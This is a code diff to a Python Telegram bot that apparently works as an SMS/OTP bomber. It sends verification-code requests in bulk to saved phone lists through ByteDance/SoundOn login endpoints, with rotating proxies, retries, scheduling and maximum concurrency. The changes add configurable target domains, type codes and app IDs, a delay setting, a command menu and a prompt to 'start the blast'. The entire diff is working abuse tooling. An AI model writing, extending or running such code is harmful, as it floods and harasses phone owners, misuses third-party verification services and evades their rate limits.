@@ -2042,11 +2042,20 @@ class SoundOnOTPSender:
     SEND_URL = "https://www.soundon.global/passport/web/send_code/"
     REFERER = "https://www.soundon.global/login/login?lang=en&region=PK"
 
-    def __init__(self):
+    def __init__(self, domain: Optional[str] = None,
+                 type_code: Optional[int] = None,
+                 aid: Optional[str] = None):
         self.session = requests.Session()
         self.session.headers["user-agent"] = SOUNDON_UA
         self.csrf = ""
         self.ms_token = ""
+        self.custom_domain = domain
+        self.custom_tc = type_code or 3635
+        self.custom_aid = aid or "2960"
+        if domain:
+            self.REGION_URL = f"https://{domain}/passport/web/region/"
+            self.SEND_URL = f"https://{domain}/passport/web/send_code/"
+            self.REFERER = f"https://{domain}/login/login?lang=en&region=PK"
 
     def _apply_proxy(self, proxy: Optional[str]):
         if proxy:
@@ -2059,7 +2068,7 @@ class SoundOnOTPSender:
     def _refresh_tokens(self, proxy: Optional[str] = None):
         self._apply_proxy(proxy)
         params = {
-            "aid": "2960",
+            "aid": self.custom_aid,
             "account_sdk_source": "web",
             "sdk_version": "2.1.10-tiktok",
             "language": "en",
@@ -2088,10 +2097,10 @@ class SoundOnOTPSender:
             self._apply_proxy(proxy)
             encoded = _soundon_encode_phone(phone)
             body = (
-                f"mix_mode=1&mobile={encoded}&type=3635&language=en&fixed_mix_mode=1"
+                f"mix_mode=1&mobile={encoded}&type={self.custom_tc}&language=en&fixed_mix_mode=1"
             )
             params = {
-                "aid": "2960",
+                "aid": self.custom_aid,
                 "account_sdk_source": "web",
                 "sdk_version": "2.1.10-tiktok",
                 "language": "en",
@@ -2182,6 +2191,7 @@ class Task:
     app_key: str = "pipix"
     results: List[Dict] = field(default_factory=list)
     start_time: float = field(default_factory=time.time)
+    delay: float = 0.0
 
 
 @dataclass
@@ -2346,6 +2356,7 @@ async def send_message_safe(context: ContextTypes.DEFAULT_TYPE, chat_id: str, te
 # ============================================
 
 async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore,
+                         delay: float = 0.0,
                          app_key: str = DEFAULT_APP,
                          override_domain: Optional[str] = None,
                          override_tc: Optional[int] = None,
@@ -2375,10 +2386,12 @@ async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Sema
         
         await global_stats.increment(result.get("success", False))
         result["app"] = app_key
+        if delay > 0:
+            await asyncio.sleep(delay)
         return result
 
 
-async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore) -> Dict:
+async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore, delay: float = 0.0) -> Dict:
     """Send Super/Pipixia OTP asynchronously using thread pool"""
     async with semaphore:
         loop = asyncio.get_event_loop()
@@ -2399,25 +2412,33 @@ async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asynci
                 result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
         
         await global_stats.increment(result.get("success", False))
+        if delay > 0:
+            await asyncio.sleep(delay)
         return result
 
 
-async def send_soundon_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore) -> Dict:
+async def send_soundon_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore,
+                                 sep_domain: Optional[str] = None,
+                                 sep_tc: Optional[int] = None,
+                                 sep_aid: Optional[str] = None,
+                                 delay: float = 0.0) -> Dict:
     """Send SoundOn (Mobile /sep) OTP asynchronously using thread pool."""
     async with semaphore:
         loop = asyncio.get_event_loop()
         proxy = random.choice(proxies) if proxies else None
 
-        sender = SoundOnOTPSender()
+        sender = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
         result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
 
         # One retry on hard failure with a fresh proxy
         if not result.get("success") and proxies:
             retry_proxy = random.choice(proxies)
-            sender2 = SoundOnOTPSender()
+            sender2 = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
             result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, retry_proxy)
 
         await global_stats.increment(result.get("success", False))
+        if delay > 0:
+            await asyncio.sleep(delay)
         return result
 
 
@@ -2480,7 +2501,52 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await start_command(update, context)
+    """Comprehensive list of ALL bot commands with usage."""
+    msg = """<b>COMPLETE COMMAND LIST</b>
+
+<b>--- OTP Sending ---</b>
+/single +number - Send single OTP
+/single +number ip:port - Single OTP with proxy
+/bulk - Bulk OTP to all saved numbers
+/sep - Mobile (SoundOn) bulk SMS to saved numbers
+/sep +number - Single SoundOn test
+/zijie - Super/Pipixia bulk OTP
+/zijiesingle +number - Single Super OTP
+
+<b>--- Scheduling ---</b>
+/schedule HH:MM - Schedule /bulk at time (PKT)
+/schedulesep HH:MM - Schedule /sep at time (PKT)
+/scheduled - List pending scheduled tasks
+/cancelschedule ID - Cancel a scheduled task
+
+<b>--- Numbers & Proxies ---</b>
+/setnumbers - Paste numbers (multi-msg, /done to save)
+/uploadnumbers - Upload TXT/CSV files (/done to save)
+/setproxies - Paste proxies (multi-msg, /done to save)
+/uploadproxies - Upload proxy files (/done to save)
+/clearnumbers - Clear saved numbers
+/clearproxies - Clear saved proxies
+/done - Finish and save buffered data
+
+<b>--- App Configuration ---</b>
+/apps - List ALL ByteDance apps
+/setapp name - Configure app (domain/tc/aid)
+/apps2 - List CONFIRMED working apps
+/setapp2 name - Configure confirmed app
+/setsep - Configure /sep domain, type code, AID
+/setdelay seconds - Set delay between requests (0=max speed)
+
+<b>--- Monitoring ---</b>
+/status - Bot status + your data count
+/tasks - Active running tasks
+/cancel ID - Cancel a running task
+/stats - Global hit statistics
+
+<b>--- General ---</b>
+/start - Main menu with buttons
+/help - This command list
+"""
+    await update.message.reply_text(msg, parse_mode="HTML")
 
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3000,6 +3066,25 @@ async def zijiesingle_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
 
 
+
+async def setsep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Configure custom domain, type code and AID for Mobile (SoundOn) /sep.
+
+    Flow: domain -> type code -> AID (interactive inline buttons).
+    """
+    user_id = update.effective_user.id
+    keyboard = [
+        [InlineKeyboardButton("soundon.global (default)", callback_data="setsep_dom|default")],
+        [InlineKeyboardButton("Custom Domain", callback_data="setsep_dom|custom")],
+    ]
+    await update.message.reply_text(
+        "<b>Configure /sep (Mobile SoundOn)</b>\n\n"
+        "Step 1/3: Select domain:",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+    )
+
+
 async def sep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Send Mobile (SoundOn) SMS via /sep using saved numbers + proxies.
 
@@ -3025,7 +3110,48 @@ async def sep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     proxies = user_states[user_id].get('proxies', [])
-    await start_soundon_bulk_task(update, context, numbers, proxies)
+    sep_domain = user_states[user_id].get('sep_domain')
+    sep_tc = user_states[user_id].get('sep_tc')
+    sep_aid = user_states[user_id].get('sep_aid')
+    user_delay = user_states[user_id].get('delay', 0.0)
+    await start_soundon_bulk_task(update, context, numbers, proxies,
+                                   sep_domain=sep_domain, sep_tc=sep_tc,
+                                   sep_aid=sep_aid, user_delay=user_delay)
+
+
+
+async def setdelay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Set delay between requests (seconds). Applies to /bulk, /sep, /zijie, etc.
+
+    Usage: /setdelay 1      (1 second between each request)
+           /setdelay 0.5    (half second)
+           /setdelay 0      (no delay, maximum speed - default)
+    """
+    user_id = update.effective_user.id
+    if not context.args:
+        current = user_states[user_id].get('delay', 0.0)
+        await update.message.reply_text(
+            "<b>Set Request Delay</b>\n\n"
+            f"Current delay: <code>{current}s</code>\n\n"
+            "Usage: <code>/setdelay 1</code> (1 sec between each request)\n"
+            "<code>/setdelay 0.5</code> (half second)\n"
+            "<code>/setdelay 0</code> (no delay, max speed)\n\n"
+            "This delay applies to /bulk, /sep, /zijie, /schedule, /schedulesep.",
+            parse_mode="HTML",
+        )
+        return
+    try:
+        delay = float(context.args[0])
+        if delay < 0:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("Invalid delay. Use a positive number (seconds).", parse_mode="HTML")
+        return
+    user_states[user_id]['delay'] = delay
+    if delay == 0:
+        await update.message.reply_text("Delay removed. Maximum speed.", parse_mode="HTML")
+    else:
+        await update.message.reply_text(f"Delay set to <code>{delay}s</code> between each request.", parse_mode="HTML")
 
 
 async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3059,6 +3185,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     data = query.data
+
+    # Route /setsep callbacks
+    if data.startswith("setsep_"):
+        await _handle_setsep_callback(query, query.from_user.id, data)
+        return
+
     
     if data == "bulk":
         user_id = query.from_user.id
@@ -3318,6 +3450,7 @@ async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, nu
     task.override_tc = user_states[user_id].get('selected_tc')
     task.override_aid = user_states[user_id].get('selected_aid')
     task.domain_mode = user_states[user_id].get('domain_mode', 'single')
+    task.delay = user_states[user_id].get("delay", 0.0)
     task.status = "running"
     task_manager.running_tasks.add(task_id)
     
@@ -3439,8 +3572,12 @@ async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Tas
                     if domains:
                         override_domain = domains[phone_index % len(domains)]
             concurrent_tasks.append(
-                send_otp_async(phone, task.proxies, semaphore, task.app_key,
-                              override_domain, override_tc, override_aid))
+                send_otp_async(phone, task.proxies, semaphore,
+                              delay=getattr(task, 'delay', 0.0),
+                              app_key=task.app_key,
+                              override_domain=override_domain,
+                              override_tc=override_tc,
+                              override_aid=override_aid))
         tasks = concurrent_tasks
         
         # Execute all concurrently
@@ -3569,9 +3706,11 @@ Device: {result.get('device_id', 'N/A')[:16]}...
 
 async def start_super_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
     """Start Super/Pipixia bulk OTP task"""
+    user_id = update.effective_user.id
     chat_id = str(update.effective_chat.id)
     task_id = await task_manager.create_task(numbers, proxies, chat_id)
     task = task_manager.get_task(task_id)
+    task.delay = user_states[user_id].get("delay", 0.0)
     task.status = "running"
     task_manager.running_tasks.add(task_id)
     
@@ -3603,7 +3742,7 @@ async def run_super_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, tas
         batch = task.phone_numbers[batch_start:batch_end]
         
         tasks = [
-            send_super_otp_async(phone, task.proxies, semaphore)
+            send_super_otp_async(phone, task.proxies, semaphore, delay=getattr(task, "delay", 0.0))
             for phone in batch
         ]
         
@@ -3681,6 +3820,98 @@ Total Failed: {g_stats['total_failed']:,}
 
 
 # ============================================
+# /setsep callback + text input handlers
+# ============================================
+
+async def _handle_setsep_callback(query, user_id, data_str):
+    """Handle setsep inline button callbacks."""
+    if data_str == "setsep_dom|default":
+        user_states[user_id]['sep_domain'] = None  # use default
+        user_states[user_id]['_setsep_domain_display'] = "soundon.global (default)"
+        # Move to step 2: type code
+        keyboard = [
+            [InlineKeyboardButton("3635 (default)", callback_data="setsep_tc|3635")],
+            [InlineKeyboardButton("Custom Type Code", callback_data="setsep_tc|custom")],
+        ]
+        await query.edit_message_text(
+            "<b>Configure /sep</b>\n\n"
+            "Domain: soundon.global (default)\n\n"
+            "Step 2/3: Select type code:",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+        )
+
+    elif data_str == "setsep_dom|custom":
+        user_states[user_id]['awaiting'] = 'setsep_custom_domain'
+        await query.edit_message_text(
+            "<b>Configure /sep</b>\n\n"
+            "Type the custom domain (e.g. <code>api.example.com</code>):",
+            parse_mode="HTML",
+        )
+
+    elif data_str.startswith("setsep_tc|"):
+        tc_val = data_str.split("|", 1)[1]
+        if tc_val == "custom":
+            user_states[user_id]['awaiting'] = 'setsep_custom_tc'
+            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+            await query.edit_message_text(
+                f"<b>Configure /sep</b>\n\n"
+                f"Domain: {domain_display}\n\n"
+                f"Type the custom type code (number):",
+                parse_mode="HTML",
+            )
+        else:
+            tc = int(tc_val)
+            user_states[user_id]['sep_tc'] = tc
+            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+            # Move to step 3: AID
+            keyboard = [
+                [InlineKeyboardButton("2960 (default)", callback_data="setsep_aid|2960")],
+                [InlineKeyboardButton("Custom AID", callback_data="setsep_aid|custom")],
+            ]
+            await query.edit_message_text(
+                f"<b>Configure /sep</b>\n\n"
+                f"Domain: {domain_display}\n"
+                f"Type Code: {tc}\n\n"
+                f"Step 3/3: Select AID:",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup(keyboard),
+            )
+
+    elif data_str.startswith("setsep_aid|"):
+        aid_val = data_str.split("|", 1)[1]
+        if aid_val == "custom":
+            user_states[user_id]['awaiting'] = 'setsep_custom_aid'
+            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+            tc = user_states[user_id].get('sep_tc', 3635)
+            await query.edit_message_text(
+                f"<b>Configure /sep</b>\n\n"
+                f"Domain: {domain_display}\n"
+                f"Type Code: {tc}\n\n"
+                f"Type the custom AID (number):",
+                parse_mode="HTML",
+            )
+        else:
+            user_states[user_id]['sep_aid'] = aid_val
+            _finish_setsep(query, user_id)
+            domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+            tc = user_states[user_id].get('sep_tc', 3635)
+            await query.edit_message_text(
+                f"<b>/sep configured!</b>\n\n"
+                f"Domain: {domain_display}\n"
+                f"Type Code: {tc}\n"
+                f"AID: {aid_val}\n\n"
+                f"Now use /sep to start the blast.",
+                parse_mode="HTML",
+            )
+
+
+def _finish_setsep(query_unused, user_id):
+    """Clean up temp setsep state."""
+    user_states[user_id].pop('_setsep_domain_display', None)
+
+
+# ============================================
 # Mobile (SoundOn /sep) bulk + single handlers
 # ============================================
 
@@ -3696,8 +3927,12 @@ async def process_single_soundon_otp(update: Update, context: ContextTypes.DEFAU
     if not proxy and proxies:
         proxy = random.choice(proxies)
 
+    sep_domain = user_states[user_id].get('sep_domain')
+    sep_tc = user_states[user_id].get('sep_tc')
+    sep_aid = user_states[user_id].get('sep_aid')
+
     loop = asyncio.get_event_loop()
-    sender = SoundOnOTPSender()
+    sender = SoundOnOTPSender(domain=sep_domain, type_code=sep_tc, aid=sep_aid)
     result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
 
     await global_stats.increment(result.get("success", False))
@@ -3729,13 +3964,21 @@ Time: {time_ms:.2f}ms
 
 
 async def start_soundon_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE,
-                                   numbers: List[str], proxies: List[str]):
+                                   numbers: List[str], proxies: List[str],
+                                   sep_domain: Optional[str] = None,
+                                   sep_tc: Optional[int] = None,
+                                   sep_aid: Optional[str] = None,
+                                   user_delay: float = 0.0):
     """Start a Mobile (SoundOn) bulk OTP task on saved numbers + proxies."""
     chat_id = str(update.effective_chat.id)
     task_id = await task_manager.create_task(numbers, proxies, chat_id)
     task = task_manager.get_task(task_id)
     task.status = "running"
     task.app_key = "soundon"
+    task.sep_domain = sep_domain
+    task.sep_tc = sep_tc
+    task.sep_aid = sep_aid
+    task.delay = user_delay
     task_manager.running_tasks.add(task_id)
 
     await update.message.reply_text(
@@ -3751,10 +3994,14 @@ async def start_soundon_bulk_task(update: Update, context: ContextTypes.DEFAULT_
 
 
 async def run_soundon_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
-    """Run Mobile (SoundOn) bulk task with rate limiting + progress logs."""
-    semaphore = asyncio.Semaphore(5)
+    """Run Mobile (SoundOn) bulk task with full concurrency + progress logs."""
+    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OTP)
     batch_results: List[Dict] = []
     last_log_count = 0
+    sep_domain = getattr(task, 'sep_domain', None)
+    sep_tc = getattr(task, 'sep_tc', None)
+    sep_aid = getattr(task, 'sep_aid', None)
+    user_delay = getattr(task, 'delay', 0.0)
 
     for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
         if task.cancelled:
@@ -3763,7 +4010,9 @@ async def run_soundon_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, t
         batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
         batch = task.phone_numbers[batch_start:batch_end]
 
-        coros = [send_soundon_otp_async(phone, task.proxies, semaphore) for phone in batch]
+        coros = [send_soundon_otp_async(phone, task.proxies, semaphore,
+                                         sep_domain=sep_domain, sep_tc=sep_tc,
+                                         sep_aid=sep_aid, delay=user_delay) for phone in batch]
         results = await asyncio.gather(*coros, return_exceptions=True)
 
         for result in results:
@@ -3897,6 +4146,73 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['_pending_selected_aid'] = aid
         await _commit_app_selection(update.message, user_id)
     
+    elif awaiting == 'setsep_custom_domain':
+        user_states[user_id]['awaiting'] = None
+        domain = text.strip()
+        if not domain or '/' in domain or ' ' in domain or '.' not in domain:
+            await update.message.reply_text(
+                "Invalid domain. Send only the host (e.g. <code>api.example.com</code>).\n"
+                "Run /setsep again to retry.",
+                parse_mode='HTML')
+            return
+        user_states[user_id]['sep_domain'] = domain
+        user_states[user_id]['_setsep_domain_display'] = f"{domain} (custom)"
+        # Move to step 2: type code
+        keyboard = [
+            [InlineKeyboardButton("3635 (default)", callback_data="setsep_tc|3635")],
+            [InlineKeyboardButton("Custom Type Code", callback_data="setsep_tc|custom")],
+        ]
+        await update.message.reply_text(
+            f"<b>Configure /sep</b>\n\n"
+            f"Domain: {domain} (custom)\n\n"
+            f"Step 2/3: Select type code:",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+        )
+
+    elif awaiting == 'setsep_custom_tc':
+        user_states[user_id]['awaiting'] = None
+        try:
+            tc = int(text.strip())
+        except ValueError:
+            await update.message.reply_text("Invalid type code. Enter a number.", parse_mode='HTML')
+            return
+        user_states[user_id]['sep_tc'] = tc
+        domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+        keyboard = [
+            [InlineKeyboardButton("2960 (default)", callback_data="setsep_aid|2960")],
+            [InlineKeyboardButton("Custom AID", callback_data="setsep_aid|custom")],
+        ]
+        await update.message.reply_text(
+            f"<b>Configure /sep</b>\n\n"
+            f"Domain: {domain_display}\n"
+            f"Type Code: {tc}\n\n"
+            f"Step 3/3: Select AID:",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+        )
+
+    elif awaiting == 'setsep_custom_aid':
+        user_states[user_id]['awaiting'] = None
+        try:
+            aid = int(text.strip())
+        except ValueError:
+            await update.message.reply_text("Invalid AID. Enter a number.", parse_mode='HTML')
+            return
+        user_states[user_id]['sep_aid'] = str(aid)
+        domain_display = user_states[user_id].get('_setsep_domain_display', '?')
+        tc = user_states[user_id].get('sep_tc', 3635)
+        user_states[user_id].pop('_setsep_domain_display', None)
+        await update.message.reply_text(
+            f"<b>/sep configured!</b>\n\n"
+            f"Domain: {domain_display}\n"
+            f"Type Code: {tc}\n"
+            f"AID: {aid}\n\n"
+            f"Now use /sep to start the blast.",
+            parse_mode="HTML",
+        )
+
+
     elif awaiting == 'single_phone':
         user_states[user_id]['awaiting'] = None
         await process_single_otp(update, context, text.strip())
@@ -3996,7 +4312,9 @@ def main():
     application.add_handler(CommandHandler("setapp2", setapp2_command))
     application.add_handler(CommandHandler("zijie", zijie_command))
     application.add_handler(CommandHandler("zijiesingle", zijiesingle_command))
+    application.add_handler(CommandHandler("setsep", setsep_command))
     application.add_handler(CommandHandler("sep", sep_command))
+    application.add_handler(CommandHandler("setdelay", setdelay_command))
     application.add_handler(CommandHandler("done", done_command))
     
     # Callback handler
